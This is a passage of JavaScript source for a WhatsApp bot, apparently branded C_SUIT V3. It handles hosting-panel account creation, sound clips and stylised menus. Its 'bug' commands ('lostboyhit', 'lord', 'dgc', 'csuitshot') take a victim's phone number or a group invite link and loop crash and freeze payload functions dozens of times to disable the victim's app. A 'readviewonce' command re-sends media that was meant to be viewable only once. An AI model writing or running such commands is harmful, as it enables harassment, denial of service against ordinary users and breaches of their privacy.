let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "7158"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCESSFULLY CREATED USER ID: ${user.id}`)
ctf = `Hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}  
break
case "unli": {
    if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner ')
let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCESSFULLY CREATED USER ID: ${user.id}`)
ctf = `Hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
> DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}        
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
LostBoyTechInc._dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await LostBoyTechInc.sendMessage(m.chat, { audio: LostBoyTechInc._dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'lostboyhit': case 'lava': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replyCsuit(mess.owner)
if (!q) return replyCsuit(`Example: ${prefix + command} 233###
> ONLY USE THIS COMMAND IN PERSON 
> ALSO DONT ADD AMOUNT JUST NUMBER`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
}
replyCsuit(`
🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await LostBoyTechInc.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break 
case 'dgc': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replyCsuit(mess.owner)
if (!q) return replyCsuit(`Use .${command} https://chat.whatsapp.com/`)
replyCsuit(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await LostBoyTechInc.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await caltx(target, true)
await sleep(10)
await freezegc(target, true)
}
replyCsuit(`
🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await LostBoyTechInc.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

break
case 'lord': case 'ui-freeze': case 'flooded': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replyCsuit(mess.owner)
if (!q) return replyCsuit(`Example: ${prefix + command} 233###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await newvirpen(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
replyCsuit(`
🦣 *CSUIT* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await LostBoyTechInc.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
    case 'csuitshot': case 'p1': case 'penetrate': case 'tackle':{
if (!isCreator) return replyCsuit(mess.owner)
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, LostBoyTechInc, ptcp = true)
await freezekamoflase(m.chat, LostBoyTechInc, ptcp = true)
await freezeui(m.chat, LostBoyTechInc, ptcp = true)
await freezeuii(m.chat, LostBoyTechInc, ptcp = true)
await newvirpen(m.chat, LostBoyTechInc, ptcp =true)
}
}

break
case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replyCsuit(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyCsuit(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return LostBoyTechInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return LostBoyTechInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
replyCsuit('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            
  case 'menu2': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
    let xmenu_oh = `C_SUIT_V3🔥
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*    
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*

■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄
> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄
> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.
> 𝙼𝙴𝙽𝚄2
> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2
> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2


▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ 
☞ *BY* ᒪOᔕTᗷOY
╚════════════════════`;
LostBoyTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./C-SMedia/menu2.jpg'),
                        caption: xmenu_oh 
                    }, {
                        quoted: m
                    })
LostBoyTechInc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })   
}
break;
case 'csuitmenu': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `🤪`, key: m.key }})
    const xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*    
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*

■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄
> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄
> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.
> 𝙼𝙴𝙽𝚄2
> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2
> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2

▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ 
☞ *BY* ᒪOᔕTᗷOY
╚════════════════════`;

    if (typemenu === 'v1') {
        LostBoyTechInc.sendMessage(m.chat, {
            text: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v2') {
        LostBoyTechInc.sendMessage(m.chat, {
            video: fs.readFileSync('./C-SMedia/11.mp3'),
            gifPlayback: true,
            caption: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v3') {
        LostBoyTechInc.sendMessage(m.chat, {
            video: fs.readFileSync('./C-SMedia/11.mp3'),
            caption: xmenu_oh,
            gifPlayback: true
        }, { quoted: m });
    } else if (typemenu === 'v4') {
        LostBoyTechInc.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
                callType: "AUDIO",
                scheduledTimestampMs: 1200,
                title: xmenu_oh
            }
        }, {});
    }
    break;
}
case 'creampiemenu2': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💦`, key: m.key }})
    const xmenu_oh = `
𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
  ᑕᖇᗴᗩᗰᑭIᗴ ᗰᗴᑎᑌ

> 𝙷𝙽𝙴𝙺𝙾
> 𝚃𝚁𝙰𝙿
> 𝙶𝙸𝙵𝙱𝙻𝙾𝚆𝙹𝙾𝙱
> 𝙰𝙽𝙸𝙼𝙴𝚂𝙿𝙰𝙽𝙺
> 𝙽𝚆𝙰𝙸𝙵𝚄
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ 
☞ *BY* ᒪOᔕTᗷOY 
╚════════════════════`;

    if (typemenu === 'v1') {
        LostBoyTechInc.sendMessage(m.chat, {
            text: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v2') {
        LostBoyTechInc.sendMessage(m.chat, {
            video: fs.readFileSync('./C-SMedia/11.mp3'),
            gifPlayback: true,
            caption: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v3') {
        LostBoyTechInc.sendMessage(m.chat, {
            video: fs.readFileSync('./C-SMedia/11.mp3'),
            caption: xmenu_oh,
            gifPlayback: true
        }, { quoted: m });
    } else if (typemenu === 'v4') {
        LostBoyTechInc.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
                callType: "AUDIO",
                scheduledTimestampMs: 1200,
                title: xmenu_oh
            }
        }, {});
    }
    break;
}


                case 'funmenu2':                                        xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*               
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*

■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᖴᑌᑎ ᗰᗴᑎᑌ 
 
> 𝙲𝙴𝙲𝙰𝙽-𝙸𝙽𝙳𝙾
> 𝙴𝙽𝙲𝙾𝙳𝙴
> 𝚂𝚂
> 𝙴𝙽𝙲𝚁𝚈𝙿𝚃
> 𝚁𝙿𝚂
> 𝚅𝚅
> 𝚅𝚅𝟸
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ 
☞ *BY* ᒪOᔕTᗷOY `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                
                                case 'bugmenu2':          xmenu_oh = `
ᗷᑌᘜ ᗰᗴᑎᑌ 
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}

 ᗩᑎᗪᖇOIᗪ 
 
> 𝙻𝙾𝚂𝚃𝙱𝙾𝚈𝙷𝙸𝚃
> 𝙻𝙾𝚁𝙳
> 𝙲𝚂𝚄𝙸𝚃𝚂𝙷𝙾𝚃
> 𝙿𝟷
> 𝚃𝙰𝙲𝙺𝙻𝙴
> 𝙻𝙰𝚅𝙰
> 𝙿𝙴𝙽𝙴𝚃𝚁𝙰𝚃𝙴

 IOՏ 
 
> 𝙵𝙻𝙾𝙾𝙳𝙴𝙳

 ᘜᑕ 
 
> 𝙳𝙶𝙲
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂`
      if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/0i4wiu.png',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                

                case 'ownermenu2':
xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 Oᗯᑎᗴᖇ ᗰᗴᑎᑌ 

> 𝙶𝙴𝚃𝚂𝙴𝚂𝚂𝙸𝙾𝙽
> 𝙳𝙴𝙻𝙴𝚃𝙴𝚂𝙴𝚂𝚂𝙸𝙾𝙽
> 𝙹𝙾𝙸𝙽
> 𝚂𝙷𝚄𝚃𝙳𝙾𝚆𝙽
> 𝚁𝙴𝚂𝚃𝙰𝚁𝚃
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙰𝙳 𝙾𝙽/𝙾𝙵𝙵
